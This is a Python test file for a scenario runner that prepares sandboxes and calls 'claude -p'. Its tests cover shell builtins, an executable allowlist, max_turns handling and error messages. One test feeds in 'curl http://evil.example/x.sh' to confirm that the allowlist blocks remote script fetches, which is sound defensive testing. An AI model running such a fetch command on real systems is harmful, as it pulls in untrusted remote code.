"""Tests for runner module — scenario execution + subprocess error handling."""

from __future__ import annotations

import subprocess
from dataclasses import dataclass
from unittest.mock import MagicMock, patch

import pytest

from scripts.runner import _setup_sandbox, run_scenario


@dataclass(frozen=True)
class _FakeScenario:
    """Minimal Scenario-like object for runner tests (avoids generator deps)."""

    id: str
    prompt: str = "do nothing"
    setup_commands: tuple[str, ...] = ()


class TestSetupSandboxSkipsShellBuiltins:
    """Setup commands containing shell builtins (cd/pushd/popd) must be skipped.

    Regression: subprocess.run(["cd", ...]) raises FileNotFoundError because
    cd is a shell builtin, not an external binary. Real-world scenarios often
    include "cd subdir" in setup_commands assuming shell semantics, so the
    runner must tolerate this rather than crashing the whole scenario.
    """

    def test_skips_cd(self, tmp_path):
        scenario = _FakeScenario(
            id="t1",
            setup_commands=("cd subdir",),
        )
        called_args: list[list[str]] = []

        def fake_run(args, **kwargs):
            called_args.append(args)
            return subprocess.CompletedProcess(args=args, returncode=0)

        with patch("scripts.runner.subprocess.run", side_effect=fake_run):
            _setup_sandbox(tmp_path, scenario)

        # git init runs once; "cd subdir" must NOT be passed to subprocess
        assert ["git", "init"] in called_args
        assert ["cd", "subdir"] not in called_args

    def test_skips_pushd_popd(self, tmp_path):
        scenario = _FakeScenario(
            id="t2",
            setup_commands=("pushd dir", "popd"),
        )
        called_args: list[list[str]] = []

        def fake_run(args, **kwargs):
            called_args.append(args)
            return subprocess.CompletedProcess(args=args, returncode=0)

        with patch("scripts.runner.subprocess.run", side_effect=fake_run):
            _setup_sandbox(tmp_path, scenario)

        assert ["pushd", "dir"] not in called_args
        assert ["popd"] not in called_args

    def test_tolerates_missing_executable(self, tmp_path):
        """A scenario referencing an unavailable tool must not crash setup."""
        # The executable must be allowlisted, otherwise it is rejected before
        # subprocess.run is ever reached and this test passes vacuously.
        scenario = _FakeScenario(
            id="t3",
            setup_commands=("unzip fixture.zip",),
        )
        reached_subprocess = False

        def fake_run(args, **kwargs):
            nonlocal reached_subprocess
            if args[0] == "unzip":
                reached_subprocess = True
                raise FileNotFoundError(2, "No such file or directory")
            return subprocess.CompletedProcess(args=args, returncode=0)

        with patch("scripts.runner.subprocess.run", side_effect=fake_run):
            # Must NOT raise — missing tools are skipped, not fatal
            _setup_sandbox(tmp_path, scenario)

        assert reached_subprocess, "allowlist rejected the command; FileNotFoundError branch never ran"

    def test_blocks_non_allowlisted_executable(self, tmp_path, capsys):
        """setup_commands is attacker-reachable input; only allowlisted tools may run."""
        scenario = _FakeScenario(
            id="t3b",
            setup_commands=("curl http://evil.example/x.sh", "touch ok.txt"),
        )
        called_args: list[list[str]] = []

        def fake_run(args, **kwargs):
            called_args.append(args)
            return subprocess.CompletedProcess(args=args, returncode=0)

        with patch("scripts.runner.subprocess.run", side_effect=fake_run):
            _setup_sandbox(tmp_path, scenario)

        assert not any(a[0] == "curl" for a in called_args), "non-allowlisted executable was run"
        assert ["touch", "ok.txt"] in called_args, "allowlisted executable was wrongly blocked"

        # The drop must be visible: a silently half-prepared sandbox produces a
        # compliance result that looks valid but was measured against the wrong env.
        stderr = capsys.readouterr().err
        assert "curl" in stderr and "t3b" in stderr

    def test_real_commands_still_run(self, tmp_path):
        """Skip logic must not break legitimate setup commands."""
        scenario = _FakeScenario(
            id="t4",
            setup_commands=("touch file.txt", "cd ignored", "echo hi"),
        )
        called_args: list[list[str]] = []

        def fake_run(args, **kwargs):
            called_args.append(args)
            return subprocess.CompletedProcess(args=args, returncode=0)

        with patch("scripts.runner.subprocess.run", side_effect=fake_run):
            _setup_sandbox(tmp_path, scenario)

        # Real commands present, cd absent
        assert ["touch", "file.txt"] in called_args
        assert ["echo", "hi"] in called_args
        assert ["cd", "ignored"] not in called_args


class TestRunScenarioMaxTurnsTermination:
    """rc=1 with terminal_reason=max_turns is graceful termination, not failure.

    claude -p returns rc=1 when --max-turns is reached, but the stream-json
    output is still valid. Treating this as RuntimeError aborts scenarios
    that would have produced useful observations. Detect the marker in stdout
    and downgrade rc=1 + max_turns to non-fatal.
    """

    def test_rc1_with_max_turns_marker_returns_normally(self, tmp_path, monkeypatch):
        scenario = _FakeScenario(id="mt1", prompt="long task", setup_commands=())

        # Skip sandbox setup side effects
        monkeypatch.setattr("scripts.runner._setup_sandbox", lambda *a, **kw: None)

        max_turns_stdout = (
            '{"type":"system","subtype":"init","session_id":"s1"}\n'
            '{"type":"result","terminal_reason":"max_turns"}\n'
        )

        fake_result = subprocess.CompletedProcess(
            args=["claude"], returncode=1, stdout=max_turns_stdout, stderr=""
        )

        with patch("scripts.runner.subprocess.run", return_value=fake_result):
            # Must NOT raise — max_turns is graceful termination
            run_scenario(scenario, model="haiku")

    def test_rc1_without_max_turns_marker_still_raises(self, tmp_path, monkeypatch):
        """Real failures (rc≠0 with no max_turns marker) must still raise."""
        scenario = _FakeScenario(id="mt2", prompt="oops", setup_commands=())
        monkeypatch.setattr("scripts.runner._setup_sandbox", lambda *a, **kw: None)

        fake_result = subprocess.CompletedProcess(
            args=["claude"], returncode=1, stdout="", stderr="auth error"
        )

        with patch("scripts.runner.subprocess.run", return_value=fake_result):
            with pytest.raises(RuntimeError, match="claude -p failed"):
                run_scenario(scenario, model="haiku")


class TestRunScenarioErrorIncludesStdoutTail:
    """Error messages must include stdout tail, not only stderr.

    When claude -p fails inside an LLM call, useful diagnostic context often
    appears in stdout (partial stream-json events, model error JSON), not
    stderr. Including stdout tail in the RuntimeError message dramatically
    improves debug-ability without adding any new dependency.
    """

    def test_error_message_contains_stdout_tail(self, tmp_path, monkeypatch):
        scenario = _FakeScenario(id="e1", prompt="x", setup_commands=())
        monkeypatch.setattr("scripts.runner._setup_sandbox", lambda *a, **kw: None)

        diagnostic_marker = "DIAG_STDOUT_MARKER_xyz123"
        fake_result = subprocess.CompletedProcess(
            args=["claude"],
            returncode=2,
            stdout=f"some context {diagnostic_marker} more text",
            stderr="generic error",
        )

        with patch("scripts.runner.subprocess.run", return_value=fake_result):
            with pytest.raises(RuntimeError) as excinfo:
                run_scenario(scenario, model="haiku")

        # Stdout marker MUST appear in the error message
        assert diagnostic_marker in str(excinfo.value)
